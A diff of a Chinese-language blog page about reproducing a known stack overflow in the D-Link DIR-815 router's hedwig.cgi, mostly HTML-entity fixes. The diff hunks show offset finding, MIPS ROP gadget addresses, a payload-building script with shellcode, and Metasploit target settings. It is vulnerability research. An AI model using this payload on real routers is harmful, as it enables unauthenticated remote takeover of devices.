@@ -10,9 +10,8 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="文章修改后在安全客发表，链接
-漏洞介绍
-Buffer overflow on “hedwig.cgi”Another buffer overflow affects the “hedwig.cgi”,"> 
+    <meta name="description" content="漏洞介绍
+Buffer overflow on “hedwig.cgi”Another buffer overflow affects the “hedwig.cgi” CGI script. Un,"> 
     <meta name="author" content="青云"> 
     <link rel="alternative" href="atom.xml" title="pup2y&#39;s world" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.jpg"> 
@@ -71,8 +70,7 @@ Buffer overflow on “hedwig.cgi”Another buffer overflow affects the “hedwig
 
         </div>
         <div class="content markdown">
-            <p>文章修改后在安全客发表，<a href="https://www.anquanke.com/post/id/206626" target="_blank" rel="noopener">链接</a></p>
-<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
+            <h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
 <p>Buffer overflow on “hedwig.cgi”<br>Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
 </blockquote>
 <p>从漏洞公告中可以看出，该漏洞存在于名为<strong>“hedwig.cgi”</strong>的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个<strong>超长的Cookie值</strong>，使得程序<strong>栈溢出</strong>，从而获得路由器的远程控制权限。</p>
@@ -88,7 +86,7 @@ Buffer overflow on “hedwig.cgi”Another buffer overflow affects the “hedwig
 </ul>
 <h1 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h1><p><code>binwalk -Me</code>解压 </p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/binwalk.png" alt="">  </p>
-<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
+<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name &#39;*cgi&#39;</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/find-name.png" alt=""></p>
 <p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code>。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/http_cookie.png" alt=""></p>
@@ -146,7 +144,7 @@ test=$(python -c "print 'uid='+open('test','r').read(2000)")
 LEN=$(echo -n "$test" | wc -c)
 PORT="23957"
 cp $(which qemu-mipsel-static) ./qemu
-sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2&gt;/dev/null
+sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
 rm -f ./qemu</code></pre>
 <p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。</p>
 <p><code>python patternLocOffset.py -c -l 2000 -f test</code></p>
@@ -154,7 +152,7 @@ rm -f ./qemu</code></pre>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ra.png" alt=""></p>
 <p><code>python patternLocOffset.py -s 0x38694237 -l 2000</code>确定缓冲区距离ra的距离为1043。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB.png" alt=""></p>
-<p>可以通过修改test.sh中的<code>test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")</code>进一步确定偏移为1043。</p>
+<p>可以通过修改test.sh中的<code>test =$(python -c &quot;print &#39;uid=&#39; + &#39;A&#39;*1043 + &#39;B&#39;*4&quot;)</code>进一步确定偏移为1043。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/1043offset.png" alt=""></p>
 <p>以上是触发第一个sprintf()的偏移。</p>
 <h4 id="重新确定偏移"><a href="#重新确定偏移" class="headerlink" title="重新确定偏移"></a>重新确定偏移</h4><p>更改test.sh，在脚本中加入echo “uid=xxx”。</p>
@@ -203,7 +201,7 @@ b *0x409a54</code></pre>
 <p>有了system函数，接下来考虑如何将system函数的第一个参数从栈中拷贝到寄存器a0中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找能将栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，$a0=$(sp+0x10),这样system函数的第一个参数就能从栈中得到了。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gadget.png" alt=""></p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/jalrs0.png" alt=""></p>
-<p>继续在libuClibc-0.9.30.1.so中寻找能够将system函数地址+1的gadget，使用mipsrop插件，<code>mipsrop.find("addiu .*,1")</code>得到31个gadget，找到0x00045988处，这个gadget的作用是将寄存器s0中的值加一，并跳转至s1寄存器中，所以需要将system函数地址减一之后放入s0寄存器中。并将获取第一个参数a0的gadget0x159cc放入s1寄存器中。</p>
+<p>继续在libuClibc-0.9.30.1.so中寻找能够将system函数地址+1的gadget，使用mipsrop插件，<code>mipsrop.find(&quot;addiu .*,1&quot;)</code>得到31个gadget，找到0x00045988处，这个gadget的作用是将寄存器s0中的值加一，并跳转至s1寄存器中，所以需要将system函数地址减一之后放入s0寄存器中。并将获取第一个参数a0的gadget0x159cc放入s1寄存器中。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/addiu1.png" alt=""></p>
 <p>到这里我们需要的gadget就找好，由IDA中的汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%A6%86%E7%9B%96.png" alt=""></p>
@@ -256,7 +254,7 @@ f<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <p>整个ROP的调用流程参考<a href="https://www.anquanke.com/post/id/179510#h3-6" target="_blank" rel="noopener">H4lo</a>师傅的图。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%B0%83%E7%94%A8sleep.png" alt=""></p>
 <p>1.ROP Gadget 1</p>
-<p>利用<code>mipsrop.find("li $a0,1")</code>寻找到0x57E50，该gadget返回时跳转至s1寄存器中地址。</p>
+<p>利用<code>mipsrop.find(&quot;li $a0,1&quot;)</code>寻找到0x57E50，该gadget返回时跳转至s1寄存器中地址。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/lia0.png" alt=""></p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x57E50.png" alt=""></p>
 <p>可以将ra处覆盖为<code>ra=gadget1=0x57E50+libc_base</code>。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr $ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.</p>
@@ -275,7 +273,7 @@ f<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/14F28.png" alt=""></p>
 <p>所以接下来我们需要的gadget4是’move $t9,$s1’，跳转到是s1也就是我们的shellcode。</p>
 <p>4.ROP Gadget 4</p>
-<p>利用<code>mipsrop.find("move $t9,$s1")</code>找到一下gadget。</p>
+<p>利用<code>mipsrop.find(&quot;move $t9,$s1&quot;)</code>找到一下gadget。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/movet9s1.png" alt=""></p>
 <p>这里选择0x1DD08作为gadget4，<code>s4=gadget4=0x1DD08+libc_base</code>。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x1DD08.png" alt=""></p>
@@ -326,7 +324,7 @@ payload <span class="token operator">+=</span> shellcode</code></pre>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/shellcode2.png" alt=""></p>
 <p>所以到目前为止，利用qemu用户模式还没有成功获取shell！！！</p>
 <h1 id="qemu系统模式"><a href="#qemu系统模式" class="headerlink" title="qemu系统模式"></a>qemu系统模式</h1><p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
-<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><code>find ./ -name '*http*'</code>找到web配置文件httpcfg.php。</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><code>find ./ -name &#39;*http*&#39;</code>找到web配置文件httpcfg.php。</p>
 <pre class=" language-sh"><code class="language-sh">./etc/services/HTTP/httpcfg.php
 ./etc/services/HTTP/httpsvcs.php
 ./usr/sbin/httpc
@@ -400,7 +398,7 @@ Control
         <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"                /usr/sbin/phpcgi { txt }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
         <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"                /usr/sbin/phpcgi { router_info.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
@@ -417,7 +415,7 @@ Control
         <span class="token string">'           Location /htdocs/smart404'</span><span class="token punctuation">.</span>     <span class="token string">'\n'</span><span class="token punctuation">.</span>
         <span class="token string">'       }'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token keyword">echo</span>
         <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
@@ -516,7 +514,7 @@ Control
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 
-<span class="token delimiter">?&gt;</span></code></pre>
+<span class="token delimiter">?></span></code></pre>
 <p>可以了解到该php用于生成配置文件，由于我们只需要其中的http服务，可以按照该配置文件改写我们所需的conf。</p>
 <pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
 PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
@@ -626,19 +624,19 @@ ln -s  /htdocs/cgibin /usr/sbin/hnap
 <pre class=" language-sh"><code class="language-sh">#curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"
 *   Trying 192.168.79.143...
 * Connected to 192.168.79.143 (192.168.79.143) port 1234 (#0)
-&gt; POST /hedwig.cgi HTTP/1.1
-&gt; Host: 192.168.79.143:1234
-&gt; User-Agent: curl/7.47.0
-&gt; Accept: */*
-&gt; Cookie: uid=zh
-&gt; Content-Length: 8
-&gt; 
-&lt; HTTP/1.1 200 OK
-&lt; Server: Linux, HTTP/1.1, 
-&lt; Date: Sun, 24 May 2020 01:00:46 GMT
-&lt; Transfer-Encoding: chunked
-&lt; Content-Type: text/xml
-&lt; 
+> POST /hedwig.cgi HTTP/1.1
+> Host: 192.168.79.143:1234
+> User-Agent: curl/7.47.0
+> Accept: */*
+> Cookie: uid=zh
+> Content-Length: 8
+> 
+< HTTP/1.1 200 OK
+< Server: Linux, HTTP/1.1, 
+< Date: Sun, 24 May 2020 01:00:46 GMT
+< Transfer-Encoding: chunked
+< Content-Type: text/xml
+< 
 * Connection #0 to host 192.168.79.143 left intact
 <hedwig><result>FAILED</result><message>no xml data.</message></hedwig>% </code></pre>
 <p>然后在mips虚拟机查看log文件：</p>
@@ -669,7 +667,7 @@ Content-Type: text/xml
 #之前分析过因为没有post数据
 <hedwig><result>FAILED</result><message>no xml data.</message></hedwig>
 root@debian-mipsel:~/squashfs-root# </code></pre>
-<p>使用<code>echo 'uid=1234'| /htdocs/web/hedwig.cgi</code>运行成功。</p>
+<p>使用<code>echo &#39;uid=1234&#39;| /htdocs/web/hedwig.cgi</code>运行成功。</p>
 <pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# echo 'uid=1234'| /htdocs/web/hedwig.cgi 
 root@debian-mipsel:~/squashfs-root# </code></pre>
 <p>接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化。</p>
@@ -703,14 +701,14 @@ root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
 root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
 root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"
 
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
 [10] 1052
 cat: /proc/pid/maps: No such file or directory
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
 [11] 1054
 cat: /proc/pid/maps: No such file or directory
 [10]+  Stopped                 /htdocs/web/hedwig.cgi
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/1056/maps 
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps 
 [12] 1056
 00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin
 0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin
@@ -806,18 +804,18 @@ gadget4 = 0x1DD08#0x15C84#0xBB44
 
 payload = 'A' * 973 #1009-9*4
 payload += 'A' * 4                           # s0
-payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2
+payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() && move $ra,$(sp+0x24) && jr s2
 payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
 payload += 'A' * 4                        # s3
-payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode
+payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") && jr shellcode
 payload += 'A' * 4                           # s5
 payload += 'A' * 4                        # s6
 payload += 'A' * 4                        # s7
 payload += 'A' * 4                        # fp
-payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1
+payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") && jr s1
 
 payload += 'B' * 0x24 # mipsrop.tail() 0x24B padding
-payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4
+payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() && move s1,$(sp+0x18) && jr $s4
 
 payload += 'c' * 0x18 # mipsrop.stackfinder() 0x18B padding
 payload += shellcode
@@ -963,12 +961,12 @@ Service Info: OS: Linux; Device: WAP; CPE: cpe:/h:dlink:dir-815:1.01, cpe:/o:lin
 <p>其实这里需要跟之前qemu系统模式一样，上传gdbsever进行调试确定偏移和libc基地址。这里直接利用师傅帖子中的代码进行测试。这里的基地址是根据firmadyne中用linux内核版本为2.6.32，别的帖子中测试的基地址为0x2aaf8000，并且metasploit里面的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb" target="_blank" rel="noopener">payload</a>写到：路由器环境中基地址为0x2aaf8000，qemu环境为0x40854000。两个可以都试试！</p>
 <pre class=" language-sh"><code class="language-sh">[ 'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600',
             {
-              'Offset'      =&gt; 973,
-              'LibcBase'    =&gt; 0x2aaf8000,    # Router
-              #'LibcBase'   =&gt; 0x40854000,    # QEMU environment
-              'System'      =&gt; 0x000531FF,    # address of system
-              'CalcSystem'  =&gt; 0x000158C8,    # calculate the correct address of system
-              'CallSystem'  =&gt; 0x000159CC,    # call our system
+              'Offset'      => 973,
+              'LibcBase'    => 0x2aaf8000,    # Router
+              #'LibcBase'   => 0x40854000,    # QEMU environment
+              'System'      => 0x000531FF,    # address of system
+              'CalcSystem'  => 0x000158C8,    # calculate the correct address of system
+              'CallSystem'  => 0x000159CC,    # call our system
             }
           ]</code></pre>
 <p>下面编写exp进行测试，利用system函数进行测试。</p>
@@ -1021,25 +1019,7 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
 <p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell" target="_blank" rel="noopener">Building MIPS Environment for Router &amp;&amp; PWN</a> </p>
 <p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a> </p>
 <p><a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">一个mips栈溢出</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                 <source type="audio/mpeg" src="">
